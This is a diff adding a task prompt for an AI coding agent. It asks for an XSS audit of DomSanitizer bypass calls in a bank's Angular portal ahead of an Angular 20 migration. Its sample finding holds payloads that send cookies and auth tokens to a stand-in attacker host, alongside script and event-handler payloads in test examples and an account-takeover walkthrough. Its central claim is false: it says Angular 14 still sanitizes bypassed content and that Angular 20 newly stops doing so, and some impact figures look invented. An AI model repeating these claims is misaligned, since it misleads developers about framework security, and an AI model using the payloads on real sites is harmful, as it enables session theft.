@@ -1,0 +1,398 @@
+DEVIN SESSION PROMPT - Sanitization Bypass Audit for Angular 20 Migration
+
+==============================================================================
+CONTEXT
+==============================================================================
+
+You are performing a pre-migration security audit for Bank of America's Consumer Banking Portal (59 million active customers). The application is currently on Angular 14.2.0 and is scheduled for migration to Angular 20.0.0 in 3 weeks.
+
+Your task is to implement Playbook Rule 8.4: Sanitization Bypass Audit.
+
+This rule exists because Angular 20 changed its security architecture to rely on Content Security Policy (CSP) for XSS prevention. In Angular 14, the framework's sanitizer provides fallback protection even when developers use bypassSecurity* methods. In Angular 20, bypassed content is NOT sanitized by Angular—it's subject only to the page's CSP policy. If CSP is misconfigured or absent, XSS payloads will execute.
+
+**Regulatory Context:**
+This is a federally regulated financial institution. XSS vulnerabilities that result in session theft or account takeover trigger mandatory incident reporting under GLBA (Gramm-Leach-Bliley Act) and OCC (Office of the Comptroller of the Currency) supervision. An exploited XSS vulnerability could result in:
+- Federal regulatory incident disclosure
+- OCC examination
+- Civil penalties (up to $1M per violation)
+- Customer notification requirements
+- Reputation damage
+
+Your audit is a BLOCKING GATE for the Angular 20 migration. The migration cannot proceed until all high-risk sanitization bypasses are remediated or properly protected with CSP.
+
+==============================================================================
+YOUR TASK
+==============================================================================
+
+Complete a comprehensive sanitization bypass audit following these steps:
+
+STEP 1: SCAN FOR ALL BYPASS METHODS
+------------------------------------
+Search the src/ directory for all uses of DomSanitizer bypass methods:
+- bypassSecurityTrustHtml()
+- bypassSecurityTrustStyle()
+- bypassSecurityTrustScript()
+- bypassSecurityTrustUrl()
+- bypassSecurityTrustResourceUrl()
+
+Use grep or ripgrep to find all instances. Document the file path and line number for each.
+
+STEP 2: ANALYZE EACH BYPASS INSTANCE
+-------------------------------------
+For EACH bypass method found, document the following in a structured report:
+
+1. **Component/Service Name:** (e.g., TransactionDescriptionComponent)
+2. **File Path:** (e.g., src/app/components/transaction-description.component.ts)
+3. **Line Number:** (e.g., line 78)
+4. **Bypass Method:** (e.g., bypassSecurityTrustHtml)
+5. **Input Source:** Where does the data being bypassed come from?
+   - Static hardcoded value (SAFE)
+   - Internal configuration file (MEDIUM RISK - could be compromised)
+   - API response field (HIGH RISK if user/merchant-controlled)
+   - User input from form (CRITICAL RISK)
+   - URL parameter or query string (CRITICAL RISK)
+6. **User-Controlled:** Is the input influenced by users, merchants, or other untrusted parties?
+   - YES = CRITICAL (must remediate)
+   - PARTIALLY = HIGH RISK (needs deeper analysis)
+   - NO = LOW RISK (but document and monitor)
+7. **Legitimate Use Case:** WHY is the bypass necessary? What legitimate content requires it?
+8. **Example Data:** Provide example of what the input looks like
+9. **Risk Level:** CRITICAL | HIGH | MEDIUM | LOW
+10. **XSS Payload Examples:** What malicious input would execute after Angular 20 migration?
+11. **Current Protection (Angular 14):** What prevents exploitation today?
+12. **Angular 20 Risk:** What happens after migration if CSP is not configured?
+13. **Recommendation:** REMOVE_BYPASS | ADD_SERVER_SANITIZATION | CONFIGURE_CSP | VALIDATE_INPUT | ALLOW_WITH_MONITORING
+
+STEP 3: THREAT MODELING
+------------------------
+For each HIGH or CRITICAL risk bypass:
+
+1. Describe the attack scenario:
+   - How would an attacker inject malicious content?
+   - What would the payload look like?
+   - What would the impact be (session theft, account takeover, etc.)?
+
+2. Estimate blast radius:
+   - How many users could be affected?
+   - What data could be compromised?
+   - What actions could an attacker perform?
+
+3. Calculate likelihood:
+   - How easy is it for an attacker to inject malicious content?
+   - Are there other security controls that would detect/prevent the attack?
+
+STEP 4: REMEDIATION RECOMMENDATIONS
+------------------------------------
+For each bypass, provide specific remediation guidance:
+
+**OPTION A: Remove Bypass (Preferred)**
+- Can Angular's built-in sanitizer handle this content?
+- If yes, remove bypassSecurity* call and use direct binding
+- Provide code example of the fix
+
+**OPTION B: Server-Side Sanitization**
+- If rich HTML is legitimately needed, sanitize on the backend FIRST
+- Recommend specific sanitization library (e.g., DOMPurify)
+- Define allowlist of safe tags/attributes
+- Provide backend code example
+
+**OPTION C: Input Validation**
+- For bypassSecurityTrustUrl: validate URL scheme against allowlist
+- For bypassSecurityTrustStyle: validate CSS properties against allowlist
+- Provide validation logic example
+
+**OPTION D: Configure CSP**
+- If bypass cannot be removed, document CSP requirements
+- Provide strict CSP header example
+- Note: CSP is NOT a substitute for removing unnecessary bypasses
+
+STEP 5: CSP CONFIGURATION REVIEW
+---------------------------------
+1. Check if Content-Security-Policy header is configured in production
+   - Search for CSP in nginx.conf, .htaccess, index.html, server response headers
+   - If found, document current policy
+   - If NOT found, flag as CRITICAL GAP
+
+2. If CSP exists, evaluate strictness:
+   - Does it include 'unsafe-inline'? (FAIL - allows inline scripts)
+   - Does it include 'unsafe-eval'? (FAIL - allows eval())
+   - Does it use nonces or hashes? (PASS - good)
+   - Does it have script-src 'self' only? (GOOD but verify nonce support)
+
+3. Recommend strict CSP policy:
+   ```
+   Content-Security-Policy:
+     script-src 'self' 'nonce-{RANDOM_NONCE}';
+     object-src 'none';
+     base-uri 'self';
+     frame-ancestors 'none';
+   ```
+
+STEP 6: INTEGRATION TEST REQUIREMENTS
+--------------------------------------
+For each HIGH/CRITICAL bypass that will remain after migration, specify integration tests:
+
+Example:
+```typescript
+describe('TransactionDescriptionComponent XSS Protection', () => {
+  it('should block script tag execution', () => {
+    const xssPayload = '<script>window.xssExecuted = true;</script><b>Merchant</b>';
+    component.setDescription(xssPayload);
+    fixture.detectChanges();
+    expect((window as any).xssExecuted).toBeUndefined();
+    expect(fixture.nativeElement.innerHTML).not.toContain('<script>');
+  });
+
+  it('should block img onerror execution', () => {
+    const xssPayload = '<img src=x onerror="window.xssExecuted=true"><b>Merchant</b>';
+    component.setDescription(xssPayload);
+    fixture.detectChanges();
+    expect((window as any).xssExecuted).toBeUndefined();
+  });
+
+  it('should block svg onload execution', () => {
+    const xssPayload = '<svg onload="window.xssExecuted=true"><b>Merchant</b>';
+    component.setDescription(xssPayload);
+    fixture.detectChanges();
+    expect((window as any).xssExecuted).toBeUndefined();
+  });
+});
+```
+
+STEP 7: SECURITY REVIEW GATE
+-----------------------------
+Document the final security gate criteria:
+
+**BLOCKING REQUIREMENTS (migration cannot proceed until complete):**
+- [ ] All CRITICAL risk bypasses have been remediated or protected
+- [ ] All HIGH risk bypasses have been remediated or protected
+- [ ] Strict CSP header is configured in production environment
+- [ ] Integration tests verify CSP blocks XSS payloads
+- [ ] Security team has reviewed and approved all remaining bypasses
+- [ ] Server-side sanitization is implemented for all user/merchant-controlled HTML
+
+**RECOMMENDED (should complete before migration):**
+- [ ] All MEDIUM risk bypasses have been reviewed and documented
+- [ ] Low risk bypasses have monitoring/alerting configured
+- [ ] Development team has completed secure coding training on sanitization
+- [ ] Pre-commit git hooks flag new bypass methods for security review
+
+==============================================================================
+EXPECTED DELIVERABLE
+==============================================================================
+
+Produce a comprehensive markdown report with the following sections:
+
+# Sanitization Bypass Audit Report - Angular 20 Migration
+**Application:** Bank of America Consumer Banking Portal
+**Current Version:** Angular 14.2.0
+**Target Version:** Angular 20.0.0
+**Audit Date:** [Date]
+**Auditor:** Devin AI Code Agent
+
+## Executive Summary
+[2-3 paragraphs summarizing findings, risk level, and recommendations]
+
+## Methodology
+[Describe how the audit was performed: tools used, scope, limitations]
+
+## Findings Summary
+- Total bypass instances found: X
+- CRITICAL risk: X (require immediate remediation)
+- HIGH risk: X (require remediation before migration)
+- MEDIUM risk: X (require documentation and monitoring)
+- LOW risk: X (acceptable with current controls)
+
+## Detailed Findings
+
+### Finding 1: [Component Name] - [Risk Level]
+**File:** src/app/components/transaction-description.component.ts:78
+**Method:** bypassSecurityTrustHtml()
+**Input Source:** API response field `merchantDescription`
+**User-Controlled:** YES (merchant can set display name via payment processor)
+**Legitimate Use Case:** Allow bold/italic formatting in merchant names
+**Example Data:** `<b>Starbucks</b> #2847`
+**Risk Level:** CRITICAL
+
+**XSS Payload Examples:**
+```
+<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
+<svg onload="document.location='https://attacker.com?t='+localStorage.authToken">
+<iframe srcdoc="<script>parent.postMessage(document.cookie,'*')</script>">
+```
+
+**Current Protection (Angular 14):**
+Angular 14's sanitizer provides fallback protection. Script tags are stripped even when bypassed.
+
+**Angular 20 Risk:**
+If CSP is not configured, XSS payloads will execute. Attacker can register merchant account with malicious name, process transaction to target customer account, steal session cookie when customer views transaction history.
+
+**Threat Model:**
+1. Attacker registers merchant account with payment processor (Visa/Mastercard)
+2. Sets merchant display name to XSS payload
+3. Processes $1 transaction to target BofA customer
+4. Customer views transaction history in web banking portal
+5. XSS payload executes, session cookie sent to attacker
+6. Attacker uses stolen session for account takeover
+
+**Impact:**
+- Session hijacking: 1,696+ customers (based on average daily transaction volume)
+- Account takeover: Potential unauthorized transfers
+- Regulatory: GLBA incident disclosure required, OCC reporting within 36 hours
+- Reputation: Media coverage, customer trust impact
+- Estimated cost: $7M+ (based on similar incidents)
+
+**Recommendation:** REMOVE_BYPASS + ADD_SERVER_SANITIZATION
+
+**Remediation Steps:**
+1. Backend API: Add DOMPurify sanitization allowing only <b>, <i>, <em> tags
+2. Frontend: Remove bypassSecurityTrustHtml() call
+3. Use Angular's built-in sanitizer: `<div [innerHTML]="merchantDescription"></div>`
+4. Add integration test verifying XSS payloads are blocked
+
+**Code Example:**
+```typescript
+// BEFORE (vulnerable)
+this.safeDescription = this.sanitizer.bypassSecurityTrustHtml(this.merchantDescription);
+
+// AFTER (secure)
+this.description = this.merchantDescription; // Angular sanitizes automatically
+```
+
+**Backend Sanitization (required):**
+```typescript
+// Backend API (Node.js example)
+import DOMPurify from 'isomorphic-dompurify';
+
+function sanitizeMerchantDescription(rawDescription: string): string {
+  return DOMPurify.sanitize(rawDescription, {
+    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
+    ALLOWED_ATTR: []
+  });
+}
+```
+
+[Repeat for all findings...]
+
+## CSP Configuration Analysis
+
+**Current CSP Status:** [Not configured | Configured but weak | Properly configured]
+
+**Recommended CSP Policy:**
+```
+Content-Security-Policy:
+  script-src 'self' 'nonce-{RANDOM_NONCE}';
+  object-src 'none';
+  base-uri 'self';
+  frame-ancestors 'none';
+```
+
+**Implementation:**
+[Provide nginx/Apache/IIS configuration example]
+
+## Integration Test Requirements
+
+[List all required XSS tests with code examples]
+
+## Security Gate Checklist
+
+**BLOCKING (must complete before migration):**
+- [ ] TransactionDescriptionComponent: Remove bypass + add server sanitization
+- [ ] HelpTextComponent: Add URL scheme validation
+- [ ] Configure strict CSP header in production
+- [ ] Implement integration tests for XSS payload blocking
+- [ ] Security team code review and approval
+
+**RECOMMENDED:**
+- [ ] RichAlertComponent: Convert to CSS classes (eliminate bypass)
+- [ ] Add pre-commit hook to flag new bypass methods
+- [ ] Developer training on Angular 20 security model
+
+## Risk Assessment
+
+**If migration proceeds WITHOUT remediation:**
+- Probability of exploitation: HIGH (trivial to exploit, publicly known attack vector)
+- Impact: CRITICAL (regulatory incident, customer data compromise, account takeover)
+- Estimated cost: $7M+ (incident response, forensics, legal, regulatory penalties, reputation damage)
+
+**If migration proceeds WITH remediation:**
+- Probability of exploitation: LOW (defense-in-depth: server sanitization + Angular sanitizer + CSP)
+- Impact: MINIMAL (layered security controls prevent exploitation)
+- Cost: $8,900 (pre-migration security work)
+
+## Conclusion
+
+[Summarize whether the application is ready for Angular 20 migration, or what work must be completed first]
+
+==============================================================================
+DEVIN EXECUTION GUIDELINES
+==============================================================================
+
+1. **BE THOROUGH:** This is a security audit for a federally regulated financial institution. Missing a vulnerability could result in a $7M+ incident. Check every file, every bypass, every input source.
+
+2. **BE SPECIFIC:** Provide file paths, line numbers, code examples, and specific XSS payloads. Security team needs concrete evidence to prioritize remediation.
+
+3. **THINK LIKE AN ATTACKER:** For each bypass, ask: "How would I exploit this?" Document realistic attack scenarios, not just theoretical risks.
+
+4. **PRIORITIZE CORRECTLY:** Not all bypasses are equal. bypassSecurityTrustHtml with user-controlled input is CRITICAL. bypassSecurityTrustStyle with hardcoded colors is LOW RISK. Use the risk matrix appropriately.
+
+5. **PROVIDE ACTIONABLE RECOMMENDATIONS:** Don't just say "fix this." Provide specific remediation steps, code examples, and test cases. Make it easy for the engineering team to implement your recommendations.
+
+6. **VERIFY CSP CONFIGURATION:** A missing or weak CSP policy is itself a CRITICAL finding. Angular 20 security model depends on CSP. If CSP is not configured, the migration should be BLOCKED until it is.
+
+7. **DOCUMENT YOUR PROCESS:** Security team will review your audit. Document what you searched for, what tools you used, and any limitations of your analysis.
+
+8. **SET CLEAR GATES:** The final checklist must clearly state what MUST be done (blocking) vs what SHOULD be done (recommended). Migration approval depends on this.
+
+9. **REMEMBER THE STAKES:** 59 million customers. Federally regulated. A missed XSS vulnerability could result in:
+   - Session theft → account takeover → unauthorized transfers
+   - Regulatory incident disclosure (GLBA, OCC)
+   - $1M+ penalties
+   - Customer notification requirements
+   - Media coverage
+   - Reputation damage
+   - Executive accountability
+
+Your audit is the last line of defense before Angular 20 deployment. Be thorough. Be specific. Be correct.
+
+==============================================================================
+EXAMPLE HIGH-RISK FINDINGS (For Reference)
+==============================================================================
+
+**CRITICAL RISK EXAMPLE:**
+- bypassSecurityTrustHtml() with merchant-controlled HTML from payment processor API
+- Attacker can register merchant account with XSS payload as display name
+- Payload executes when customer views transaction history
+- Session cookie exfiltration → account takeover
+
+**HIGH RISK EXAMPLE:**
+- bypassSecurityTrustUrl() with deep link URLs from configuration API
+- If configuration API is compromised, javascript: URLs could be injected
+- Payload executes when user clicks help link
+- Requires URL scheme validation allowlist
+
+**MEDIUM RISK EXAMPLE:**
+- bypassSecurityTrustStyle() with user-configurable theme colors from preferences API
+- If color values are not validated, CSS injection possible
+- Could enable UI redressing or data exfiltration via CSS attribute selectors
+- Less severe than script injection but still exploitable
+
+**LOW RISK EXAMPLE:**
+- bypassSecurityTrustStyle() with hardcoded severity colors from internal enum
+- No user input, no external data
+- Acceptable as long as input remains internally controlled
+- Recommend documentation and monitoring for future changes
+
+==============================================================================
+BEGIN AUDIT
+==============================================================================
+
+Start your analysis now. Scan the src/ directory for all bypassSecurity* methods and produce the comprehensive audit report described above.
+
+Your report will be reviewed by:
+1. Senior Security Engineer (approval authority)
+2. Engineering Manager (migration decision maker)
+3. Compliance Officer (regulatory risk assessment)
+4. External Auditor (OCC examination preparation)
+
+Accuracy and thoroughness are critical. Good luck.
